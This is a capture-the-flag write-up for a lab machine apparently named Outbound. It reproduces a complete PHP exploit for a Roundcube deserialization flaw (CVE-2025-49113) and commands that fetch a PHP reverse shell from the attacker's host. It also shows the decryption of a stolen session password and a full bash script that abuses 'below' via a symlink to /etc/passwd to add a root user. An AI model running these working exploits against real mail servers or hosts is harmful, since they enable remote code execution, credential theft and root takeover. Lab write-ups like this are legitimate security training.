we start with a nmap scan and we find a website on port 80

```bash
Discovered open port 80/tcp on 10.129.243.86
Discovered open port 22/tcp on 10.129.243.86
```

when we access the website, we are redirected to

```bash
http://mail.outbound.htb/
```

so we add mail.outbound.htb to the hosts file

```bash
echo 10.129.243.86 mail.outbound.htb | sudo tee -a /etc/hosts
```

we try ffuf to check if there are any other subdomains but without any result

```bash
ffuf -w /home/bhugo97/.pentest-toolbox/wordlists/subdomain-wordlist.txt -u http://outbound.htb:80 -H 'Host: FUZZ.outbound.htb' -fs 154 -o ffuf_output.json -t 64 -v

```

after adding the entry to the host files, we are welcomed with a roundcube webmail login page
since we start with credentials `tyler:LhKL1o9Nm3X2` we try to login to roundcube but with no avail

we try gobuster but it's failing because all urls return 200

we try to ssh into the server with the starting credentials but it doesn't work

since nothing work, we try a nmap UDP scan

```bash
nmap -sU --top-ports 1000 -A -T4 -v -oN 16h25_[2025-10-03]_mail.outbound.htb_nmap.txt mail.outbound.htb

68/udp    open|filtered dhcpc
1055/udp  open|filtered ansyslmd
8900/udp  open|filtered jmb-cds1
19283/udp open|filtered keysrvr
20449/udp open|filtered unknown
21556/udp open|filtered unknown
25003/udp open|filtered icl-twobase4
49173/udp open|filtered unknown
51255/udp open|filtered unknown
64590/udp open|filtered unknown

```

while nmap and ffuf are running in the background, we try to find CVE for roundcube
we find the following CVE:

- CVE-2025-49113

we find the following POC for CVE-2025-49113

```php
<?php
class Crypt_GPG_Engine
{
    public $_process = false;
    public $_gpgconf = '';
    public $_homedir = '';

    public function __construct($_gpgconf)
    {
        $_gpgconf = base64_encode($_gpgconf);
        $this->_gpgconf = "echo \"{$_gpgconf}\"|base64 -d|sh;#";
    }

    public function gadget()
    {
        return '|'. serialize($this) . ';';
    }
}

function checkVersion($baseUrl)
{
    echo "[*] Checking Roundcube version...\n";

    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
            'ignore_errors' => true,
        ],
    ]);

    $response = file_get_contents($baseUrl, false, $context);

    if ($response === FALSE) {
        echo "[-] Error: Failed to check version.\n";
        exit(1);
    }

    $vulnerableVersions = [
        '10500', '10501', '10502', '10503', '10504', '10505', '10506', '10507', '10508', '10509',
        '10600', '10601', '10602', '10603', '10604', '10605', '10606', '10607', '10608', '10609', '10610'
    ];

    preg_match('/"rcversion":(\d+)/', $response, $matches);

    if (empty($matches[1])) {
        echo "[-] Error: Could not detect Roundcube version.\n";
        exit(1);
    }

    $version = $matches[1];
    echo "[*] Detected Roundcube version: " . $version . "\n";

    if (in_array($version, $vulnerableVersions)) {
        echo "[+] Target is vulnerable!\n";
        return true;
    } else {
        echo "[-] Target is not vulnerable.\n";
        exit(1);
    }
}

function login($baseUrl, $user, $pass)
{
    // Configuration to capture session cookies
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
            'ignore_errors' => true,
            // 'request_fulluri' => false, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ]);

    // Make a GET request to the initial page
    $response = file_get_contents($baseUrl, false, $context);

    if ($response === FALSE) {
        echo "Error: Failed to obtain the initial page.\n";
        exit(1);
    }

    // Extract the 'roundcube_sessid' cookie
    preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessid' cookie not found.\n";
        exit(1);
    }
    $sessionCookie = 'roundcube_sessid=' . $matches[1];

    // Extract the CSRF token from the JavaScript code
    preg_match('/"request_token":"([^"]+)"/', $response, $matches);
    if (empty($matches[1])) {
        echo "Error: CSRF token not found.\n";
        exit(1);
    }

    $csrfToken = $matches[1];

    $url = $baseUrl . '/?_task=login';

    $data = http_build_query([
        '_token'    => $csrfToken,
        '_task'     => 'login',
        '_action'   => 'login',
        '_timezone' => 'America/Sao_Paulo',
        '_url'      => '',
        '_user'     => $user,
        '_pass'     => $pass,
    ]);

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n" .
                        "Cookie: " . $sessionCookie . "\r\n",
            'method'  => 'POST',
            'content' => $data,
            'ignore_errors' => true,
            // 'request_fulluri' => true, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        echo "Error: Failed to make the request.\n";
        exit(1);
    }

    // Check the HTTP status code
    $statusLine = $http_response_header[0];
    preg_match('{HTTP/\S*\s(\d{3})}', $statusLine, $match);
    $status = $match[1];

    if ($status == 401) {
        echo "Error: Incorrect credentials.\n";
        exit(1);
    } elseif ($status != 302) {
        echo "Error: Request failed with status code $status.\n";
        exit(1);
    }

    // Extract the last 'roundcube_sessauth' cookie from the login response, ignoring the cookie with value '-del-'
    preg_match_all('/Set-Cookie: roundcube_sessauth=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessauth' cookie not found.\n";
        exit(1);
    }
    $authCookie = 'roundcube_sessauth=' . end($matches[1]);

    // Extract the 'roundcube_sessid' cookie from the login response
    preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessid' cookie not found.\n";
        exit(1);
    }
    $sessionCookie = 'roundcube_sessid=' . $matches[1];

    echo "[+] Login successful!\n";

    return [
        'sessionCookie' => $sessionCookie,
        'authCookie' => $authCookie,
    ];
}

function uploadImage($baseUrl, $sessionCookie, $authCookie, $gadget)
{
    $uploadUrl = $baseUrl . '/?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload1749190777535&_unlock=loading1749190777536&_action=upload';

    // Hardcoded PNG image in base64
    $base64Image = 'iVBORw0KGgoAAAANSUhEUgAAAIAAAABcCAYAAACmwr2fAAAAAXNSR0IArs4c6QAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAICgAwAEAAAAAQAAAFwAAAAAbqF/KQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAWBJREFUeAHt1MEJACEAxMDzSvEn2H97CrYx2Q4Swo659vkaa+BnyQN/BgoAD6EACgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B6gAHADOH4PUAC4ARy/BygA3ACO3wMUAG4Ax+8BCgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B4AD+ACXpACLpoPsQQAAAAASUVORK5CYII=';

    // Decode the base64 image
    $fileContent = base64_decode($base64Image);
    if ($fileContent === FALSE) {
        echo "Error: Failed to decode the base64 image.\n";
        exit(1);
    }

    $boundary = uniqid();
    $data = "--" . $boundary . "\r\n" .
            "Content-Disposition: form-data; name=\"_file[]\"; filename=\"" . $gadget . "\"\r\n" .
            "Content-Type: image/png\r\n\r\n" .
            $fileContent . "\r\n" .
            "--" . $boundary . "--\r\n";

    $options = [
        'http' => [
            'header'  => "Content-type: multipart/form-data; boundary=" . $boundary . "\r\n" .
                        "Cookie: " . $sessionCookie . "; " . $authCookie . "\r\n",
            'method'  => 'POST',
            'content' => $data,
            'ignore_errors' => true,
            // 'request_fulluri' => true, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ];

    echo "[*] Exploiting...\n";

    $context  = stream_context_create($options);
    $result = file_get_contents($uploadUrl, false, $context);

    if ($result === FALSE) {
        echo "Error: Failed to send the file.\n";
        exit(1);
    }

    // Check the HTTP status code
    $statusLine = $http_response_header[0];
    preg_match('{HTTP/\S*\s(\d{3})}', $statusLine, $match);
    $status = $match[1];

    if ($status != 200) {
        echo "Error: File upload failed with status code $status.\n";
        exit(1);
    }

    echo "[+] Gadget uploaded successfully!\n";
}

function exploit($baseUrl, $user, $pass, $rceCommand)
{
    echo "[+] Starting exploit (CVE-2025-49113)...\n";

    // Check version before proceeding
    checkVersion($baseUrl);

    // Instantiate the Crypt_GPG_Engine class with the RCE command
    $gpgEngine = new Crypt_GPG_Engine($rceCommand);
    $gadget = $gpgEngine->gadget();

    // Escape double quotes in the gadget
    $gadget = str_replace('"', '\\"', $gadget);

    // Login and get session cookies
    $cookies = login($baseUrl, $user, $pass);

    // Upload the image with the gadget
    uploadImage($baseUrl, $cookies['sessionCookie'], $cookies['authCookie'], $gadget);
}

if ($argc !== 5) {
    echo "Usage: php CVE-2025-49113.php <url> <username> <password> <command>\n";
    exit(1);
}

$baseUrl = $argv[1];
$user = $argv[2];
$pass = $argv[3];
$rceCommand = $argv[4];

exploit($baseUrl, $user, $pass, $rceCommand);
```

we can try to run the POC

```bash
python3 -m http.server 8000 # Terminal 1
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'curl http://10.10.15.79:8000/$(whoami)' # Terminal 2
```

we can see the connection being established

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.236.232 - - [03/Oct/2025 19:04:48] code 404, message File not found
10.129.236.232 - - [03/Oct/2025 19:04:48] "GET /www-data HTTP/1.1" 404 -
```

we can upload a php reverse shell into roundcube public_html directory

```bash
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'wget -O /var/www/html/roundcube/public_html/shell.php http://10.10.15.79:8000/shell.php'
```

once we are in, we can log in with tyler

```bash
$ su tyler
Password: LhKL1o9Nm3X2
whoami
tyler
```

then, we can run linpeas.
we find out that jacob has a lot of mail in his inbox (way bigger than tyler or mel) he also seem to be the user that setup dovecot/roundcube.
we also find the des_key that roundcube uses to encrypt user password for the PHP session and clear-text credentials for the mysql database

```bash
  ╔══════════╣ Mails (limit 50)
     262406      4 -rw-rw----   1 jacob    mail         2169 Jun  8 12:10 /var/mail/jacob
      12353      0 -rw-rw----   1 mel      mail            0 Jun  8 12:06 /var/mail/mel
     131112      0 -r--r--r--   1 jacob    mail            0 Jul  9 12:41 /var/mail/.imap/dovecot-uidvalidity.686e6385
     131092      4 -rw-rw-r--   1 jacob    mail         1304 Jul  9 12:41 /var/mail/.imap/dovecot.list.index.log
     131113      4 -rw-rw-r--   1 jacob    mail            8 Jul  9 12:41 /var/mail/.imap/dovecot-uidvalidity
      16021      0 -rw-rw----   1 tyler    mail            0 Jun  8 13:28 /var/mail/tyler
     262406      4 -rw-rw----   1 jacob    mail         2169 Jun  8 12:10 /var/spool/mail/jacob
      12353      0 -rw-rw----   1 mel      mail            0 Jun  8 12:06 /var/spool/mail/mel

  ╔══════════╣ Analyzing Roundcube Files (limit 70)

  drwxr-xr-x 1 www-data www-data 4096 Jun  6 18:55 /var/www/html/roundcube
  -rw-r--r-- 1 root root 3024 Jun  6 18:55 /var/www/html/roundcube/config/config.inc.php
  $config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
  $config['imap_host'] = 'localhost:143';
  $config['smtp_host'] = 'localhost:587';
  $config['smtp_user'] = '%u';
  $config['smtp_pass'] = '%p';
  $config['support_url'] = '';
  $config['product_name'] = 'Roundcube Webmail';
  $config['des_key'] = 'rcmail-!24ByteDESkey*Str';
  $config['plugins'] = [
  $config['skin'] = 'elastic';
  $config['default_host'] = 'localhost';
  $config['smtp_server'] = 'localhost';
```

first, we can try connecting to the mysql database

```bash
mysql -u roundcube -p'RCDBPass2025' -S /run/mysqld/mysqld.sock roundcube
```

and list tables

```sql
SHOW TABLES;

Tables_in_roundcube
cache
cache_index
cache_messages
cache_shared
cache_thread
collected_addresses
contactgroupmembers
contactgroups
contacts
dictionary
filestore
identities
responses
searches
session
system
users

SELECT * FROM cache_messages;
(empty)

SELECT * FROM users;
user_id	username	mail_host	created	last_login	failed_login	failed_login_counter	language	preferences
1	jacob	localhost	2025-06-07 13:55:18	2025-06-11 07:52:49	2025-06-11 07:51:32	1	en_US	a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2	mel	localhost	2025-06-08 12:04:51	2025-06-08 13:29:05	NULL	NULL	en_US	a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
3	tyler	localhost	2025-06-08 13:28:55	2025-10-06 18:46:12	2025-06-11 07:51:22	1	en_US	a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";}

SELECT * FROM identities;
identity_id	user_id	changed	del	standard	name	organization	email	reply-to	bcc	signature	html_signature
1	1	2025-06-07 13:55:18	0	1	jacob		jacob@localhost			NULL	0
2	2	2025-06-08 12:04:51	0	1	mel		mel@localhost			NULL	0
3	3	2025-06-08 13:28:55	0	1	tyler		tyler@localhost			NULL	0

> SELECT * FROM session;
sess_id	changed	ip	vars
6a5ktqih5uca6lj8vrmgh9v0oh	2025-06-08 15:46:40	172.17.0.1	bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF
```

if we convert the session from base64:

```bash
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort
```

we find the encrypted password `L7Rv00A8TuwJAr67kITxxcSgnIk25Am` that we can decrypt with the roundcube

```bash
php -r "
require_once '/var/www/html/roundcube/program/lib/Roundcube/bootstrap.php';

\$rcube = rcube::get_instance();
\$rcube->config->set('des_key', 'rcmail-!24ByteDESkey*Str');

\$encrypted = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/';
\$password = \$rcube->decrypt(\$encrypted);

echo 'Password: ' . \$password . PHP_EOL;
"

Password: 595mO8DmwGeD
```

once we have the password, we can connect as jacob:

```bash
su jacob
Password: 595mO8DmwGeD
whoami
jacob
```

after connecting as jacob, we can read his mail

```bash
cat /var/mail/jacob
From tyler@outbound.htb  Sat Jun  7 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-UID: 2
Status: O

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun  8 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 3
Status: O

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

Mel mention the `main server` - this make sense since the linpeas output has been pointing to the fact that we are running in a docker container.

we can try to use jacob password sent by tyler to connect to the machine hosting our container

```bash
ssh jacob@10.129.99.99
jacob@outbound:~$ cat user.txt
```

once we are logged in, we can see that we can run the `below` command mel was talking about with `sudo`

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*

```

after searching, we find this cve:

- CVE-2025-27591

we also find a poc that allows us to create a new root user and get the root flag.

```bash
#!/bin/bash

# CVE-2025-27591 Exploit - Privilege Escalation via 'below'

TARGET="/etc/passwd"
LINK_PATH="/var/log/below/error_root.log"
TMP_PAYLOAD="/tmp/payload"
BACKUP="/tmp/passwd.bak"

echo "[*] CVE-2025-27591 Privilege Escalation Exploit"

# Check for sudo access to below
echo "[*] Checking sudo permissions..."
if ! sudo -l | grep -q '/usr/bin/below'; then
  echo "[!] 'below' is not available via sudo. Exiting."
  exit 1
fi

# Backup current /etc/passwd
echo "[*] Backing up /etc/passwd to $BACKUP"
cp /etc/passwd "$BACKUP"

# Generate password hash for 'haxor' user (password: hacked123)
echo "[*] Generating password hash..."
HASH=$(openssl passwd -6 'hacked123')

# Prepare malicious passwd line
echo "[*] Creating malicious passwd line..."
echo "haxor:$HASH:0:0:root:/root:/bin/bash" > "$TMP_PAYLOAD"

# Create symlink
echo "[*] Linking $LINK_PATH to $TARGET"
rm -f "$LINK_PATH"
ln -sf "$TARGET" "$LINK_PATH"

# Trigger log creation with invalid --time to force below to recreate the log
echo "[*] Triggering 'below' to write to symlinked log..."
sudo /usr/bin/below replay --time "invalid" >/dev/null 2>&1

# Overwrite passwd file via symlink
echo "[*] Injecting malicious user into /etc/passwd"
cat "$TMP_PAYLOAD" > "$LINK_PATH"

# Test access
echo "[*] Try switching to 'haxor' using password: hacked123"
su haxor
```
